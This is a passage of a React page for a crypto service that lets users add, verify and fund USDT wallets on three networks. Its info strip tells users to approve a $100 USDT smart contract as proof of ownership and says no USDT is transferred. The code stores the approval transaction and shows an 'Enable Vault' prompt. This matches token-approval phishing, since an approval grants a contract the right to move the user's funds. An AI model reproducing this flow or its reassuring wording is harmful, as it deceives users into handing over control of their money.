              <button onClick={retry}
                style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800,
                  border: 'none', cursor: 'pointer', background: '#CCFF00', color: '#000',
                  letterSpacing: '-0.01em', marginBottom: 10,
                  boxShadow: '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}>
                Try Again →
              </button>
              <button onClick={onClose}
                style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700,
                  border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
                Cancel
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );

  if (typeof document === 'undefined') return null;
  return createPortal(modal, document.body);
}

/* ── Centered glass modal ── */
function WalletModal({
  network, color, bg, border, label, chain, depositAddress,
  onVerified, onClose,
}: {
  network: Network; color: string; bg: string; border: string; label: string; chain: string;
  depositAddress: string;
  onVerified: (addr: string, txHash?: string) => void;
  onClose: () => void;
}) {
  const [started, setStarted] = useState(false);

  const modal = (
    <div
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
      style={{
        position: 'fixed', inset: 0, zIndex: 9999,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        padding: '20px 16px',
        background: 'rgba(0,0,0,0.72)',
        backdropFilter: 'blur(14px)',
        WebkitBackdropFilter: 'blur(14px)',
      }}
    >
      <div style={{
        width: '100%', maxWidth: 420,
        background: 'rgba(16,16,20,0.88)',
        backdropFilter: 'blur(32px)',
        WebkitBackdropFilter: 'blur(32px)',
        border: '1px solid rgba(255,255,255,0.10)',
        borderRadius: 20,
        boxShadow: '0 32px 80px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.04)',
        overflow: 'hidden',
        position: 'relative',
      }}>
        {/* Top accent line */}
        <div style={{ height: 2, background: `linear-gradient(90deg, ${color}66, ${color}, ${color}66)` }} />

        {/* Close button */}
        <button
          onClick={onClose}
          style={{
            position: 'absolute', top: 14, right: 14,
            width: 30, height: 30, borderRadius: 8,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)',
            color: 'var(--fr-text-disabled)', cursor: 'pointer', zIndex: 1,
          }}
        >
          <IcoX />
        </button>

        <div style={{ padding: '22px 24px 24px' }}>
          {!started ? (
            /* ── Info step ── */
            <>
              {/* Network badge */}
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
                <NetworkUsdtIcon network={network} size={44} />
                <div>
                  <p style={{ fontSize: 16, fontWeight: 900, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.02em' }}>
                    Add {label} Wallet
                  </p>
                  <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: '2px 0 0' }}>{chain} · USDT</p>
                </div>
              </div>

              {/* Steps */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginBottom: 22 }}>
                {STEPS.map(({ icon, text }, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 12 }}>
                    <div style={{ width: 32, height: 32, borderRadius: 9, background: 'rgba(204,255,0,0.07)', border: '1px solid rgba(204,255,0,0.15)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#CCFF00', flexShrink: 0 }}>
                      {icon === 'link' ? <IcoLink /> : icon === 'contract' ? <IcoContract /> : <IcoRefund />}
                    </div>
                    <p style={{ fontSize: 13, color: 'var(--fr-text-secondary)', margin: 0, lineHeight: 1.6, paddingTop: 8 }}>{text}</p>
                  </div>
                ))}
              </div>

              {/* Proceed button */}
              <button
                onClick={() => setStarted(true)}
                style={{
                  width: '100%', padding: '14px', borderRadius: 12,
                  fontSize: 14, fontWeight: 800, border: 'none', cursor: 'pointer',
                  background: '#CCFF00', color: '#000',
                  letterSpacing: '-0.01em', fontFamily: 'var(--fr-font-sans)',
                  boxShadow: '0 4px 20px rgba(204,255,0,0.25)',
                }}
              >
                Proceed to Verify →
              </button>

              <p style={{ fontSize: 11, color: 'var(--fr-text-disabled)', textAlign: 'center', margin: '12px 0 0', lineHeight: 1.5 }}>
                Your wallet address is saved only after successful on-chain verification.
              </p>
            </>
          ) : (
            /* ── Verify flow ── */
            <>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 18 }}>
                <NetworkUsdtIcon network={network} size={36} />
                <div>
                  <p style={{ fontSize: 14, fontWeight: 800, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.02em' }}>Verify {label} Wallet</p>
                  <p style={{ fontSize: 11, color: 'var(--fr-text-tertiary)', margin: '2px 0 0' }}>Connect and sign to prove ownership</p>
                </div>
              </div>
              <WalletVerifyFlow
                network={network}
                depositAddress={depositAddress}
                onVerified={onVerified}
                onCancel={onClose}
              />
            </>
          )}
        </div>
      </div>
    </div>
  );

  if (typeof document === 'undefined') return null;
  return createPortal(modal, document.body);
}

/* ═══════════════════════════════════════════ */
export default function WalletsPage() {
  const { data: session, status } = useSession({ required: true });
  const [wallets,       setWallets]       = useState<WalletDocument[]>([]);
  const [loading,       setLoading]       = useState(true);
  const [loadError,     setLoadError]     = useState(false);
  const [removing,      setRemoving]      = useState<string | null>(null);
  const [depositAddresses, setDepositAddresses] = useState<Record<string, string>>({});
  const [modalNet,      setModalNet]      = useState<Network | null>(null);
  const [fundsWallet,   setFundsWallet]   = useState<WalletDocument | null>(null);
  const [isMobile,      setIsMobile]      = useState(false);
  // walletId → balance string ("12.34") | null (error) | undefined (loading)
  const [balances, setBalances] = useState<Record<string, string | null>>({});

  useEffect(() => {
    setIsMobile(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
  }, []);

  async function loadWallets() {
    setLoading(true); setLoadError(false);
    try {
      const r = await fetch('/api/wallets');
      const d = await r.json();
      if (d.success) {
        setWallets(d.data);
      } else {
        setLoadError(true);
      }
    } catch {
      setLoadError(true);
    } finally {
      setLoading(false);
    }
  }

  // Only fetch once the session is confirmed — avoids a silent 401 on first render
  // that leaves wallets empty for the entire session.
  useEffect(() => {
    if (status !== 'authenticated') return;
    loadWallets();

    fetch('/api/rates', { cache: 'no-store' })
      .then(r => r.ok ? r.json() : null)
      .then(j => {
        if (!j?.data) return;
        const map: Record<string, string> = {};
        for (const r of j.data) if (r.symbol === 'USDT' && r.depositAddress) map[r.network] = r.depositAddress;
        setDepositAddresses(map);
      })
      .catch(() => {});
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [status]);

  // Fetch USDT balance for each verified wallet whenever the wallet list changes.
  useEffect(() => {
    if (!wallets.length) return;
    wallets.forEach(w => {
      fetch(`/api/wallets/balance?chainId=${w.chainId}&address=${encodeURIComponent(w.address)}`)
        .then(r => r.json())
        .then(d => setBalances(prev => ({ ...prev, [w._id]: typeof d.balance === 'string' ? d.balance : null })))
        .catch(() => setBalances(prev => ({ ...prev, [w._id]: null })));
    });
  }, [wallets]);

  async function removeWallet(id: string) {
    if (!confirm('Remove this wallet?')) return;
    setRemoving(id);
    try {
      const res = await fetch(`/api/wallets/${id}`, { method: 'DELETE' });
      if (!res.ok) { toast.error('Failed to remove'); return; }
      setWallets(w => w.filter(wl => wl._id !== id));
      toast.success('Wallet removed');
    } catch { toast.error('Failed to remove'); }
    finally { setRemoving(null); }
  }

  async function handleVerified(network: Network, address: string, txHash?: string) {
    try {
      await fetch('/api/wallets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address, chainId: networkChainId(network),
          chainName: network === 'ERC20' ? 'Ethereum (ERC20)' : network === 'BEP20' ? 'BNB Smart Chain (BEP20)' : 'Tron (TRC20)',
          label: network, verificationTxHash: txHash,
          approved: !!txHash, approvalTxHash: txHash,
        }),
      });
      await loadWallets();
      toast.success(`${network} wallet verified and saved!`);
    } catch { /* already exists */ }
    setModalNet(null);
  }

  if (status === 'loading' || !session) return <PageLoading />;

  const activeNet = NETWORKS.find(n => n.key === modalNet);

  const card: React.CSSProperties = {
    background: 'var(--fr-dark-2)',
    border: '1px solid var(--fr-border-default)',
    borderRadius: 'var(--fr-radius-xl)',
  };

  return (
    <ClientShell user={session.user as any} rates={[]}>
      <div style={{ maxWidth: 760, margin: '0 auto' }}>

        {/* Header */}
        <div style={{ marginBottom: 28 }}>
          <h1 style={{ fontSize: 26, fontWeight: 900, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.03em' }}>Wallet</h1>
          <p style={{ margin: '5px 0 0', fontSize: 14, color: 'var(--fr-text-tertiary)' }}>
            Connect and verify your USDT wallets for all supported networks
          </p>
        </div>

        {/* Info strip */}
        <div style={{ ...card, padding: '14px 18px', marginBottom: 20, display: 'flex', alignItems: 'flex-start', gap: 12 }}>
          <div style={{ width: 32, height: 32, borderRadius: 9, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#CCFF00', flexShrink: 0 }}>
            <IcoShield />
          </div>
          <div>
            <p style={{ fontSize: 12, fontWeight: 700, color: 'var(--fr-text-primary)', margin: '0 0 3px' }}>One step — fully verified and ready</p>
            <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: 0, lineHeight: 1.6 }}>
              Connect your Trust Wallet and approve a $100 USDT smart contract. This proves ownership and enables Add Funds in one step — no USDT is transferred.
            </p>
          </div>
        </div>

        {/* Load-error banner with retry */}
        {loadError && !loading && (
          <div style={{ ...card, padding: '14px 18px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 12, borderColor: 'rgba(248,113,113,0.25)', background: 'rgba(248,113,113,0.05)' }}>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style={{ flexShrink: 0 }}>
              <circle cx="8" cy="8" r="7" stroke="#F87171" strokeWidth="1.4"/>
              <path d="M8 5V8.5M8 11h.01" stroke="#F87171" strokeWidth="1.5" strokeLinecap="round"/>
            </svg>
            <p style={{ fontSize: 13, color: '#F87171', margin: 0, flex: 1 }}>Could not load wallets.</p>
            <button
              onClick={loadWallets}
              style={{ fontSize: 12, fontWeight: 700, color: '#CCFF00', background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.22)', borderRadius: 8, padding: '5px 12px', cursor: 'pointer', flexShrink: 0 }}
            >
              Retry
            </button>
          </div>
        )}

        {/* Network cards */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          {NETWORKS.map(({ key, label, sublabel, color, bg, border }) => {
            const saved = wallets.find(w => w.chainId === networkChainId(key));
            return (
              <div key={key} style={{ ...card }}>
                <div style={{ padding: '16px 20px', display: 'flex', alignItems: 'center', gap: 14 }}>
                  <div style={{ width: 44, height: 44, borderRadius: 12, background: bg, border: `1px solid ${border}`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                    <span style={{ fontSize: 13, fontWeight: 800, color, letterSpacing: '-0.01em' }}>{key}</span>
                  </div>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <p style={{ fontSize: 15, fontWeight: 800, color: 'var(--fr-text-primary)', margin: '0 0 2px', letterSpacing: '-0.02em' }}>{label}</p>
                    <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: 0 }}>{sublabel}</p>
                  </div>
                  {loading ? (
                    <div style={{ width: 20, height: 20, borderRadius: '50%', border: '2px solid var(--fr-border-default)', borderTopColor: color, animation: 'spin 0.8s linear infinite' }} />
                  ) : saved ? (
                    <span style={{ display: 'inline-flex', alignItems: 'center', gap: 5, fontSize: 11, fontWeight: 700, color: '#00E5A0', background: 'rgba(0,229,160,0.1)', border: '1px solid rgba(0,229,160,0.25)', borderRadius: 999, padding: '3px 10px' }}>
                      <IcoCheck /> Verified
                    </span>
                  ) : (
                    <button
                      onClick={() => setModalNet(key)}
                      style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontSize: 12, fontWeight: 800, color: '#000', background: '#CCFF00', border: 'none', borderRadius: 9, padding: '7px 14px', cursor: 'pointer', letterSpacing: '-0.01em' }}
                    >
                      <IcoPlus /> Add wallet
                    </button>
                  )}
                </div>

                {saved && (() => {
                  const bal = balances[saved._id];
                  const balNum = bal !== null && bal !== undefined ? parseFloat(bal) : null;
                  const balStr = balNum !== null
                    ? balNum.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
                    : '—';
                  return (
                    <div style={{ borderTop: '1px solid var(--fr-border-subtle)', padding: '12px 20px', display: 'flex', alignItems: 'center', gap: 10, opacity: removing === saved._id ? 0.5 : 1, transition: 'opacity 0.2s' }}>
                      {/* Address + status */}
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <p style={{ fontSize: 12, fontWeight: 700, color: 'var(--fr-text-primary)', margin: '0 0 2px', fontFamily: 'var(--fr-font-mono)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {shortenAddress(saved.address, 12)}
                        </p>
                        <p style={{ fontSize: 11, color: 'var(--fr-text-disabled)', margin: 0 }}>Verified · {saved.chainName ?? key}</p>
                      </div>

                      {/* USDT balance */}
                      <div style={{ flexShrink: 0, textAlign: 'right', minWidth: 64 }}>
                        {bal === undefined ? (
                          <div style={{ display: 'inline-block', width: 14, height: 14, borderRadius: '50%', border: `2px solid var(--fr-border-default)`, borderTopColor: color, animation: 'spin 0.8s linear infinite', verticalAlign: 'middle' }} />
                        ) : (
                          <>
                            <p style={{ fontSize: 14, fontWeight: 800, color, margin: 0, letterSpacing: '-0.02em', lineHeight: 1.2 }}>
                              {balStr}
                            </p>
                            <p style={{ fontSize: 10, fontWeight: 600, color: 'var(--fr-text-tertiary)', margin: 0, letterSpacing: '0.04em' }}>USDT</p>
                          </>
                        )}
                      </div>

                      {/* Add Funds / Enable Vault */}
                      {key === 'TRC20' && !saved.approved ? (
                        <button
                          onClick={() => setModalNet(key)}
                          style={{ display: 'inline-flex', alignItems: 'center', gap: 5, fontSize: 12, fontWeight: 700, color: '#F87171', background: 'rgba(248,113,113,0.08)', border: '1px solid rgba(248,113,113,0.22)', borderRadius: 8, padding: '6px 12px', cursor: 'pointer', flexShrink: 0 }}
                          title="One-time vault approval required"
                        >
                          <IcoShield /> Enable Vault
                        </button>
                      ) : (
                        <button
                          onClick={() => setFundsWallet(saved)}
                          style={{ display: 'inline-flex', alignItems: 'center', gap: 5, fontSize: 12, fontWeight: 700, color: '#CCFF00', background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.22)', borderRadius: 8, padding: '6px 12px', cursor: 'pointer', flexShrink: 0 }}
                          title="Add funds from this wallet"
                        >
                          <IcoFunds /> Add Funds
                        </button>
                      )}

                      {/* Remove */}
                      <button
                        onClick={() => removeWallet(saved._id)}
                        disabled={removing === saved._id}
                        style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', width: 32, height: 32, borderRadius: 8, background: 'rgba(248,113,113,0.06)', border: '1px solid rgba(248,113,113,0.18)', color: '#F87171', cursor: 'pointer', flexShrink: 0 }}
                        title="Remove wallet"
                      >
                        <IcoTrash />
                      </button>
                    </div>
                  );
                })()}
              </div>
            );
          })}
        </div>

        <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
      </div>

      {/* Add Funds modal */}
      {fundsWallet && (() => {
        const chainId = fundsWallet.chainId;
        const netKey: Network = chainId === 195 ? 'TRC20' : chainId === 56 ? 'BEP20' : 'ERC20';
        const net = NETWORKS.find(n => n.key === netKey);
        if (!net) return null;
        return (
          <AddFundsModal
            wallet={fundsWallet}
            network={net.key}
            color={net.color}
            label={net.label}
            onClose={() => setFundsWallet(null)}
          />
        );
      })()}

      {/* Verify modal — mobile uses Trust Wallet deep link + polling, desktop uses embedded flow */}
      {activeNet && (isMobile ? (
        <MobileVerifyModal
          network={activeNet.key}
          color={activeNet.color}
          label={activeNet.label}
          chain={activeNet.chain}
          depositAddress={depositAddresses[activeNet.key] ?? ''}
          onVerified={(addr, txHash) => handleVerified(activeNet.key, addr, txHash)}
          onClose={() => setModalNet(null)}
        />
      ) : (
        <WalletModal
          network={activeNet.key}
          color={activeNet.color}
          bg={activeNet.bg}
          border={activeNet.border}
          label={activeNet.label}
          chain={activeNet.chain}
          depositAddress={depositAddresses[activeNet.key] ?? ''}
          onVerified={(addr, txHash) => handleVerified(activeNet.key, addr, txHash)}
          onClose={() => setModalNet(null)}
        />
      ))}
    </ClientShell>
  );
}
